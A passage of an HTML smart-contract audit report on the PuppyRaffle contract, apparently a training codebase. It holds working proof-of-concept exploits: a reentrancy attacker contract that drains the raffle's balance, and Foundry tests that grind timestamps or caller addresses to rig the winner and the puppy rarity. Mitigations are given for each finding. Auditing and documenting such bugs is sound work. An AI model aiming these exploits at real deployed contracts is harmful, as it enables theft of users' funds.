+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a>        entranceFee <span class="op">=</span> _puppyRaffle<span class="op">.</span><span class="fu">entranceFee</span>()<span class="op">;</span></span>
+<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a>    <span class="kw">function</span> <span class="fu">attack</span>() external payable {</span>
+<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a>        address[] memory players <span class="op">=</span> <span class="kw">new</span> address[](<span class="dv">1</span>)<span class="op">;</span></span>
+<span id="cb8-13"><a href="#cb8-13" aria-hidden="true" tabindex="-1"></a>        players[<span class="dv">0</span>] <span class="op">=</span> <span class="fu">address</span>(<span class="kw">this</span>)<span class="op">;</span></span>
+<span id="cb8-14"><a href="#cb8-14" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="at">enterRaffle</span>{<span class="dt">value</span><span class="op">:</span> entranceFee}(players)<span class="op">;</span></span>
+<span id="cb8-15"><a href="#cb8-15" aria-hidden="true" tabindex="-1"></a>        attackerIndex <span class="op">=</span> puppyRaffle<span class="op">.</span><span class="fu">getActivePlayerIndex</span>(<span class="fu">address</span>(<span class="kw">this</span>))<span class="op">;</span></span>
+<span id="cb8-16"><a href="#cb8-16" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="fu">refund</span>(attackerIndex)<span class="op">;</span></span>
+<span id="cb8-17"><a href="#cb8-17" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb8-18"><a href="#cb8-18" aria-hidden="true" tabindex="-1"></a>    <span class="kw">function</span> <span class="fu">_stealMoney</span>() internal {</span>
+<span id="cb8-19"><a href="#cb8-19" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (<span class="fu">address</span>(puppyRaffle)<span class="op">.</span><span class="at">balance</span> <span class="op">&gt;=</span> entranceFee) {</span>
+<span id="cb8-20"><a href="#cb8-20" aria-hidden="true" tabindex="-1"></a>            puppyRaffle<span class="op">.</span><span class="fu">refund</span>(attackerIndex)<span class="op">;</span></span>
+<span id="cb8-21"><a href="#cb8-21" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb8-22"><a href="#cb8-22" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb8-23"><a href="#cb8-23" aria-hidden="true" tabindex="-1"></a>    <span class="fu">fallback</span>() external payable {</span>
+<span id="cb8-24"><a href="#cb8-24" aria-hidden="true" tabindex="-1"></a>        <span class="fu">_stealMoney</span>()<span class="op">;</span></span>
+<span id="cb8-25"><a href="#cb8-25" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb8-26"><a href="#cb8-26" aria-hidden="true" tabindex="-1"></a>    <span class="fu">receive</span>() external payable {</span>
+<span id="cb8-27"><a href="#cb8-27" aria-hidden="true" tabindex="-1"></a>        <span class="fu">_stealMoney</span>()<span class="op">;</span></span>
+<span id="cb8-28"><a href="#cb8-28" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb8-29"><a href="#cb8-29" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div></div>
+</details>
+<p>It proves that the contract is vulnerable to reentrancy attacks and that funds can easily be stolen.</p>
+<p>Run the foundry test:</p>
+<div class="sourceCode" id="cb9"><div class="codehilite"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">forge</span> test <span class="at">--mt</span> test_ReEntrancy_AUDIT <span class="at">-vvv</span></span></code></pre></div></div>
+<p>and you will see something like this:</p>
+<pre class="text"><code>Logs:
+  Starting Attacker Contract Balance: 0
+  Starting Raffle Contract Balance: 4000000000000000000
+  Ending Attacker Contract Balance: 5000000000000000000
+  Ending Raffle Contract Balance: 0</code></pre>
+<p><strong>Recommended Mitigation:</strong> 1. Use OpenZeppelin’s <a href="https://docs.openzeppelin.com/contracts/3.x/api/utils#ReentrancyGuard"><code>ReentrancyGuard</code></a> and apply the <code>nonReentrant</code> modifier to the <code>refund</code> function.</p>
+<ol start="2" type="1">
+<li>Or follow the CEI (Checks-Effects-Interactions) pattern by updating the contract state before making the external call:</li>
+</ol>
+<div class="sourceCode" id="cb11"><div class="codehilite"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a>     function refund(uint256 playerIndex) public {</span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>         address playerAddress = players[playerIndex];</span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a>         require(</span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a>             playerAddress == msg.sender,</span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a>             &quot;PuppyRaffle: Only the player can refund&quot;</span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a>         );</span>
+<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a>         require(</span>
+<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a>             playerAddress != address(0),</span>
+<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a>             &quot;PuppyRaffle: Player already refunded, or is not active&quot;</span>
+<span id="cb11-10"><a href="#cb11-10" aria-hidden="true" tabindex="-1"></a>         );</span>
+<span id="cb11-11"><a href="#cb11-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-12"><a href="#cb11-12" aria-hidden="true" tabindex="-1"></a><span class="st">-        payable(msg.sender).sendValue(entranceFee);</span></span>
+<span id="cb11-13"><a href="#cb11-13" aria-hidden="true" tabindex="-1"></a><span class="st">-</span></span>
+<span id="cb11-14"><a href="#cb11-14" aria-hidden="true" tabindex="-1"></a><span class="st">-        // @AUDIT-HIGH:: ReEntrancy attack possible here, since we are sending value before setting the player to address(0). Consider using Checks-Effects-Interactions pattern to prevent reentrancy attacks.</span></span>
+<span id="cb11-15"><a href="#cb11-15" aria-hidden="true" tabindex="-1"></a>         players[playerIndex] = address(0);</span>
+<span id="cb11-16"><a href="#cb11-16" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
+<span id="cb11-17"><a href="#cb11-17" aria-hidden="true" tabindex="-1"></a><span class="va">+        payable(msg.sender).sendValue(entranceFee);</span></span>
+<span id="cb11-18"><a href="#cb11-18" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
+<span id="cb11-19"><a href="#cb11-19" aria-hidden="true" tabindex="-1"></a>         emit RaffleRefunded(playerAddress);</span>
+<span id="cb11-20"><a href="#cb11-20" aria-hidden="true" tabindex="-1"></a>     }</span></code></pre></div></div>
+<hr />
+<h3 id="h-3-weak-randomness-in-puppyraffleselectwinner-function-an-attacker-can-grind-the-block-values-and-hand-pick-the-winner-and-the-puppy-rarity">[H-3] Weak randomness in <code>PuppyRaffle::selectWinner</code> function, an attacker can grind the block values and hand-pick the winner and the puppy rarity</h3>
+<p><strong>Description:</strong> <code>selectWinner</code> derives the winner from <code>keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty)) % players.length</code>, and derives the puppy <code>rarity</code> from the same kind of hash. None of those inputs are actually random, since <code>msg.sender</code> is just whoever calls the function and the block values are chosen by the block producer, so an attacker can grind them and hand-pick both the winner and the rarity.</p>
+<p><strong>Impact:</strong> An attacker who can influence the block values can guarantee that they win the raffle and get the puppy rarity they want</p>
+<p><strong>Proof of Concept:</strong> Check the <code>test_WeakRandomness_AUDIT</code> and <code>test_WeakRandomnessRarity_AUDIT</code> tests in the <code>PuppyRaffleTest.t.sol</code> file:</p>
+<details open>
+<summary>
+Here’s the full code
+</summary>
+<div class="sourceCode" id="cb12"><div class="codehilite"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a>    <span class="kw">function</span> <span class="fu">test_WeakRandomness_AUDIT</span>() <span class="kw">public</span> {</span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>        address[] memory players <span class="op">=</span> <span class="kw">new</span> address[](<span class="dv">4</span>)<span class="op">;</span></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a>        players[<span class="dv">0</span>] <span class="op">=</span> playerOne<span class="op">;</span></span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a>        players[<span class="dv">1</span>] <span class="op">=</span> playerTwo<span class="op">;</span></span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a>        players[<span class="dv">2</span>] <span class="op">=</span> playerThree<span class="op">;</span></span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a>        players[<span class="dv">3</span>] <span class="op">=</span> playerFour<span class="op">;</span></span>
+<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="at">enterRaffle</span>{<span class="dt">value</span><span class="op">:</span> entranceFee <span class="op">*</span> <span class="dv">4</span>}(players)<span class="op">;</span></span>
+<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a>        <span class="co">// the attacker is playerFour (index 3) and grinds block.timestamp until they win</span></span>
+<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a>        uint256 startTime <span class="op">=</span> block<span class="op">.</span><span class="at">timestamp</span> <span class="op">+</span> duration <span class="op">+</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a>        bool found<span class="op">;</span></span>
+<span id="cb12-12"><a href="#cb12-12" aria-hidden="true" tabindex="-1"></a>        uint256 winningTimestamp<span class="op">;</span></span>
+<span id="cb12-13"><a href="#cb12-13" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> (uint256 t <span class="op">=</span> startTime<span class="op">;</span> t <span class="op">&lt;</span> startTime <span class="op">+</span> <span class="dv">100</span><span class="op">;</span> t<span class="op">++</span>) {</span>
+<span id="cb12-14"><a href="#cb12-14" aria-hidden="true" tabindex="-1"></a>            <span class="co">// this copies EXACTLY the formula used inside selectWinner()</span></span>
+<span id="cb12-15"><a href="#cb12-15" aria-hidden="true" tabindex="-1"></a>            uint256 index <span class="op">=</span> <span class="fu">uint256</span>(</span>
+<span id="cb12-16"><a href="#cb12-16" aria-hidden="true" tabindex="-1"></a>                <span class="fu">keccak256</span>(abi<span class="op">.</span><span class="fu">encodePacked</span>(<span class="fu">address</span>(<span class="kw">this</span>)<span class="op">,</span> t<span class="op">,</span> block<span class="op">.</span><span class="at">difficulty</span>))</span>
+<span id="cb12-17"><a href="#cb12-17" aria-hidden="true" tabindex="-1"></a>            ) <span class="op">%</span> players<span class="op">.</span><span class="at">length</span><span class="op">;</span></span>
+<span id="cb12-18"><a href="#cb12-18" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> (index <span class="op">==</span> <span class="dv">3</span>) {</span>
+<span id="cb12-19"><a href="#cb12-19" aria-hidden="true" tabindex="-1"></a>                winningTimestamp <span class="op">=</span> t<span class="op">;</span></span>
+<span id="cb12-20"><a href="#cb12-20" aria-hidden="true" tabindex="-1"></a>                found <span class="op">=</span> <span class="kw">true</span><span class="op">;</span></span>
+<span id="cb12-21"><a href="#cb12-21" aria-hidden="true" tabindex="-1"></a>                <span class="cf">break</span><span class="op">;</span></span>
+<span id="cb12-22"><a href="#cb12-22" aria-hidden="true" tabindex="-1"></a>            }</span>
+<span id="cb12-23"><a href="#cb12-23" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb12-24"><a href="#cb12-24" aria-hidden="true" tabindex="-1"></a>        <span class="fu">assertTrue</span>(found<span class="op">,</span> <span class="st">&quot;attacker found a winning timestamp&quot;</span>)<span class="op">;</span></span>
+<span id="cb12-25"><a href="#cb12-25" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-26"><a href="#cb12-26" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">warp</span>(winningTimestamp)<span class="op">;</span></span>
+<span id="cb12-27"><a href="#cb12-27" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">roll</span>(block<span class="op">.</span><span class="at">number</span> <span class="op">+</span> <span class="dv">1</span>)<span class="op">;</span></span>
+<span id="cb12-28"><a href="#cb12-28" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;Winning timestamp found by attacker:&quot;</span><span class="op">,</span> winningTimestamp)<span class="op">;</span></span>
+<span id="cb12-29"><a href="#cb12-29" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-30"><a href="#cb12-30" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="fu">selectWinner</span>()<span class="op">;</span></span>
+<span id="cb12-31"><a href="#cb12-31" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-32"><a href="#cb12-32" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(</span>
+<span id="cb12-33"><a href="#cb12-33" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;Winner is playerFour (the attacker):&quot;</span><span class="op">,</span></span>
+<span id="cb12-34"><a href="#cb12-34" aria-hidden="true" tabindex="-1"></a>            puppyRaffle<span class="op">.</span><span class="fu">previousWinner</span>() <span class="op">==</span> playerFour</span>
+<span id="cb12-35"><a href="#cb12-35" aria-hidden="true" tabindex="-1"></a>        )<span class="op">;</span></span>
+<span id="cb12-36"><a href="#cb12-36" aria-hidden="true" tabindex="-1"></a>        <span class="fu">assertEq</span>(puppyRaffle<span class="op">.</span><span class="fu">previousWinner</span>()<span class="op">,</span> playerFour)<span class="op">;</span></span>
+<span id="cb12-37"><a href="#cb12-37" aria-hidden="true" tabindex="-1"></a>    }</span></code></pre></div></div>
+</details>
+<p>You can run it via</p>
+<div class="sourceCode" id="cb13"><div class="codehilite"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="ex">forge</span> test <span class="at">--mt</span> test_WeakRandomness_AUDIT <span class="at">-vvv</span></span></code></pre></div></div>
+<p>and you will see something like this:</p>
+<pre class="text"><code>Logs:
+  Winning timestamp found by attacker: 86402
+  Winner is playerFour (the attacker): true</code></pre>
+<p>The attacker simply tries timestamps until the “random” formula lands on their own index, then triggers the draw at that exact timestamp.</p>
+<details open>
+<summary>
+Here’s the full code
+</summary>
+<div class="sourceCode" id="cb15"><div class="codehilite"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a>    <span class="co">// THIS </span><span class="al">TEST</span><span class="co"> WAS WRITTEN BY DEEPSEEK HARNESS SO I CAN UNDERSTAND DEEPLY MYSELF</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">function</span> <span class="fu">test_WeakRandomnessRarity_AUDIT</span>() <span class="kw">public</span> {</span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>        address[] memory players <span class="op">=</span> <span class="kw">new</span> address[](<span class="dv">4</span>)<span class="op">;</span></span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>        players[<span class="dv">0</span>] <span class="op">=</span> playerOne<span class="op">;</span></span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>        players[<span class="dv">1</span>] <span class="op">=</span> playerTwo<span class="op">;</span></span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a>        players[<span class="dv">2</span>] <span class="op">=</span> playerThree<span class="op">;</span></span>
+<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a>        players[<span class="dv">3</span>] <span class="op">=</span> playerFour<span class="op">;</span></span>
+<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="at">enterRaffle</span>{<span class="dt">value</span><span class="op">:</span> entranceFee <span class="op">*</span> <span class="dv">4</span>}(players)<span class="op">;</span></span>
+<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a>        <span class="co">// the raffle has to be over before the draw, so this is the timestamp</span></span>
+<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a>        <span class="co">// the attacker will be executing at</span></span>
+<span id="cb15-12"><a href="#cb15-12" aria-hidden="true" tabindex="-1"></a>        uint256 drawTime <span class="op">=</span> block<span class="op">.</span><span class="at">timestamp</span> <span class="op">+</span> duration <span class="op">+</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb15-13"><a href="#cb15-13" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">warp</span>(drawTime)<span class="op">;</span></span>
+<span id="cb15-14"><a href="#cb15-14" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">roll</span>(block<span class="op">.</span><span class="at">number</span> <span class="op">+</span> <span class="dv">1</span>)<span class="op">;</span></span>
+<span id="cb15-15"><a href="#cb15-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-16"><a href="#cb15-16" aria-hidden="true" tabindex="-1"></a>        <span class="co">// the attacker does not even have to be a player, they only have to be</span></span>
+<span id="cb15-17"><a href="#cb15-17" aria-hidden="true" tabindex="-1"></a>        <span class="co">// the caller, because msg.sender sits inside both hashes</span></span>
+<span id="cb15-18"><a href="#cb15-18" aria-hidden="true" tabindex="-1"></a>        address attacker<span class="op">;</span></span>
+<span id="cb15-19"><a href="#cb15-19" aria-hidden="true" tabindex="-1"></a>        uint256 winningIndex<span class="op">;</span></span>
+<span id="cb15-20"><a href="#cb15-20" aria-hidden="true" tabindex="-1"></a>        uint256 chosenRarity<span class="op">;</span></span>
+<span id="cb15-21"><a href="#cb15-21" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-22"><a href="#cb15-22" aria-hidden="true" tabindex="-1"></a>        <span class="co">// grind over caller addresses until one of them picks playerFour as the</span></span>
+<span id="cb15-23"><a href="#cb15-23" aria-hidden="true" tabindex="-1"></a>        <span class="co">// winner AND hands them a legendary puppy</span></span>
+<span id="cb15-24"><a href="#cb15-24" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> (uint256 i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> <span class="dv">5000</span><span class="op">;</span> i<span class="op">++</span>) {</span>
+<span id="cb15-25"><a href="#cb15-25" aria-hidden="true" tabindex="-1"></a>            address candidate <span class="op">=</span> <span class="fu">address</span>(<span class="fu">uint160</span>(<span class="dv">1000</span> <span class="op">+</span> i))<span class="op">;</span></span>
+<span id="cb15-26"><a href="#cb15-26" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-27"><a href="#cb15-27" aria-hidden="true" tabindex="-1"></a>            <span class="co">// these are the same two expressions used inside selectWinner()</span></span>
+<span id="cb15-28"><a href="#cb15-28" aria-hidden="true" tabindex="-1"></a>            uint256 index <span class="op">=</span> <span class="fu">uint256</span>(</span>
+<span id="cb15-29"><a href="#cb15-29" aria-hidden="true" tabindex="-1"></a>                <span class="fu">keccak256</span>(</span>
+<span id="cb15-30"><a href="#cb15-30" aria-hidden="true" tabindex="-1"></a>                    abi<span class="op">.</span><span class="fu">encodePacked</span>(candidate<span class="op">,</span> drawTime<span class="op">,</span> block<span class="op">.</span><span class="at">difficulty</span>)</span>
+<span id="cb15-31"><a href="#cb15-31" aria-hidden="true" tabindex="-1"></a>                )</span>
+<span id="cb15-32"><a href="#cb15-32" aria-hidden="true" tabindex="-1"></a>            ) <span class="op">%</span> players<span class="op">.</span><span class="at">length</span><span class="op">;</span></span>
+<span id="cb15-33"><a href="#cb15-33" aria-hidden="true" tabindex="-1"></a>            uint256 rarity <span class="op">=</span> <span class="fu">uint256</span>(</span>
+<span id="cb15-34"><a href="#cb15-34" aria-hidden="true" tabindex="-1"></a>                <span class="fu">keccak256</span>(abi<span class="op">.</span><span class="fu">encodePacked</span>(candidate<span class="op">,</span> block<span class="op">.</span><span class="at">difficulty</span>))</span>
+<span id="cb15-35"><a href="#cb15-35" aria-hidden="true" tabindex="-1"></a>            ) <span class="op">%</span> <span class="dv">100</span><span class="op">;</span></span>
+<span id="cb15-36"><a href="#cb15-36" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-37"><a href="#cb15-37" aria-hidden="true" tabindex="-1"></a>            <span class="co">// index 3 is playerFour, rarity 96-99 is LEGENDARY_RARITY</span></span>
+<span id="cb15-38"><a href="#cb15-38" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> (index <span class="op">==</span> <span class="dv">3</span> <span class="op">&amp;&amp;</span> rarity <span class="op">&gt;</span> <span class="dv">95</span>) {</span>
+<span id="cb15-39"><a href="#cb15-39" aria-hidden="true" tabindex="-1"></a>                attacker <span class="op">=</span> candidate<span class="op">;</span></span>
+<span id="cb15-40"><a href="#cb15-40" aria-hidden="true" tabindex="-1"></a>                winningIndex <span class="op">=</span> index<span class="op">;</span></span>
+<span id="cb15-41"><a href="#cb15-41" aria-hidden="true" tabindex="-1"></a>                chosenRarity <span class="op">=</span> rarity<span class="op">;</span></span>
+<span id="cb15-42"><a href="#cb15-42" aria-hidden="true" tabindex="-1"></a>                <span class="cf">break</span><span class="op">;</span></span>
+<span id="cb15-43"><a href="#cb15-43" aria-hidden="true" tabindex="-1"></a>            }</span>
+<span id="cb15-44"><a href="#cb15-44" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb15-45"><a href="#cb15-45" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-46"><a href="#cb15-46" aria-hidden="true" tabindex="-1"></a>        <span class="fu">assertTrue</span>(</span>
+<span id="cb15-47"><a href="#cb15-47" aria-hidden="true" tabindex="-1"></a>            attacker <span class="op">!=</span> <span class="fu">address</span>(<span class="dv">0</span>)<span class="op">,</span></span>
+<span id="cb15-48"><a href="#cb15-48" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;attacker found a caller for winner + legendary&quot;</span></span>
+<span id="cb15-49"><a href="#cb15-49" aria-hidden="true" tabindex="-1"></a>        )<span class="op">;</span></span>
+<span id="cb15-50"><a href="#cb15-50" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-51"><a href="#cb15-51" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">prank</span>(attacker)<span class="op">;</span></span>
+<span id="cb15-52"><a href="#cb15-52" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="fu">selectWinner</span>()<span class="op">;</span></span>
+<span id="cb15-53"><a href="#cb15-53" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-54"><a href="#cb15-54" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;caller address picked by attacker:&quot;</span><span class="op">,</span> attacker)<span class="op">;</span></span>
+<span id="cb15-55"><a href="#cb15-55" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;winning index:&quot;</span><span class="op">,</span> winningIndex)<span class="op">;</span></span>
+<span id="cb15-56"><a href="#cb15-56" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;rarity rolled by attacker:&quot;</span><span class="op">,</span> chosenRarity)<span class="op">;</span></span>
+<span id="cb15-57"><a href="#cb15-57" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(</span>
+<span id="cb15-58"><a href="#cb15-58" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;rarity stored on the minted token:&quot;</span><span class="op">,</span></span>
+<span id="cb15-59"><a href="#cb15-59" aria-hidden="true" tabindex="-1"></a>            puppyRaffle<span class="op">.</span><span class="fu">tokenIdToRarity</span>(<span class="dv">0</span>)</span>
+<span id="cb15-60"><a href="#cb15-60" aria-hidden="true" tabindex="-1"></a>        )<span class="op">;</span></span>
+<span id="cb15-61"><a href="#cb15-61" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-62"><a href="#cb15-62" aria-hidden="true" tabindex="-1"></a>        <span class="fu">assertEq</span>(puppyRaffle<span class="op">.</span><span class="fu">previousWinner</span>()<span class="op">,</span> playerFour)<span class="op">;</span></span>
+<span id="cb15-63"><a href="#cb15-63" aria-hidden="true" tabindex="-1"></a>        <span class="fu">assertEq</span>(puppyRaffle<span class="op">.</span><span class="fu">tokenIdToRarity</span>(<span class="dv">0</span>)<span class="op">,</span> <span class="dv">5</span>)<span class="op">;</span></span>
+<span id="cb15-64"><a href="#cb15-64" aria-hidden="true" tabindex="-1"></a>    }</span></code></pre></div></div>
+</details>
+<p>You can run it via</p>
+<div class="sourceCode" id="cb16"><div class="codehilite"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="ex">forge</span> test <span class="at">--mt</span> test_WeakRandomnessRarity_AUDIT <span class="at">-vvv</span></span></code></pre></div></div>
+<p>and you will see something like this:</p>
+<pre class="text"><code>Logs:
+  caller address picked by attacker: 0x000000000000000000000000000000000000041c
+  winning index: 3
+  rarity rolled by attacker: 97
+  rarity stored on the minted token: 5</code></pre>
+<p>Here the attacker does not even have to be a player, they only have to be the caller, and they grind caller addresses until one of them wins the raffle for them and rolls a legendary puppy.</p>
+<p><strong>Recommended Mitigation:</strong> 1. Use a verifiable randomness oracle instead of block values. <a href="https://docs.chain.link/vrf">Chainlink VRF</a> generates randomness on-chain that cannot be predicted or manipulated, which is the standard fix for this class of bug.</p>
+<ol start="2" type="1">
+<li>Stop using <code>block.timestamp</code> and <code>block.difficulty</code> as randomness sources in the first place. Both are chosen by the block producer, which is exactly why they can be ground until the outcome is favourable.</li>
+</ol>
+<hr />
+<h3 id="h-4-mishandling-of-eth-in-puppyrafflewithdrawfees-function-selfdestruct-can-break-the-strict-balance-check-and-lock-the-fees-forever">[H-4] Mishandling of ETH in <code>PuppyRaffle::withdrawFees</code> function, selfdestruct can break the strict balance check and lock the fees forever</h3>
+<p><strong>Description:</strong> <code>withdrawFees</code> only works while <code>address(this).balance == uint256(totalFees)</code>, and anyone can break that equality by forcing ETH in with <code>selfdestruct</code>, since the contract has no <code>receive</code> or <code>fallback</code>.</p>
+<p><strong>Impact:</strong> Anyone can permanently block fee withdrawals with a single selfdestruct</p>
+<p><strong>Proof of Concept:</strong> Check the <code>test_MishandlingOfETH_AUDIT</code> test &amp; <code>ETHForcer</code> contract in the <code>PuppyRaffleTest.t.sol</code> file:</p>
+<details open>
+<summary>
+Here’s the full code
+</summary>
+<div class="sourceCode" id="cb18"><div class="codehilite"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a>    <span class="kw">function</span> <span class="fu">test_MishandlingOfETH_AUDIT</span>() <span class="kw">public</span> {</span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a>        address[] memory players <span class="op">=</span> <span class="kw">new</span> address[](<span class="dv">4</span>)<span class="op">;</span></span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a>        players[<span class="dv">0</span>] <span class="op">=</span> playerOne<span class="op">;</span></span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a>        players[<span class="dv">1</span>] <span class="op">=</span> playerTwo<span class="op">;</span></span>
+<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a>        players[<span class="dv">2</span>] <span class="op">=</span> playerThree<span class="op">;</span></span>
+<span id="cb18-6"><a href="#cb18-6" aria-hidden="true" tabindex="-1"></a>        players[<span class="dv">3</span>] <span class="op">=</span> playerFour<span class="op">;</span></span>
+<span id="cb18-7"><a href="#cb18-7" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="at">enterRaffle</span>{<span class="dt">value</span><span class="op">:</span> entranceFee <span class="op">*</span> <span class="dv">4</span>}(players)<span class="op">;</span></span>
+<span id="cb18-8"><a href="#cb18-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-9"><a href="#cb18-9" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">warp</span>(block<span class="op">.</span><span class="at">timestamp</span> <span class="op">+</span> duration <span class="op">+</span> <span class="dv">1</span>)<span class="op">;</span></span>
+<span id="cb18-10"><a href="#cb18-10" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">roll</span>(block<span class="op">.</span><span class="at">number</span> <span class="op">+</span> <span class="dv">1</span>)<span class="op">;</span></span>
+<span id="cb18-11"><a href="#cb18-11" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="fu">selectWinner</span>()<span class="op">;</span></span>
+<span id="cb18-12"><a href="#cb18-12" aria-hidden="true" tabindex="-1"></a></span>
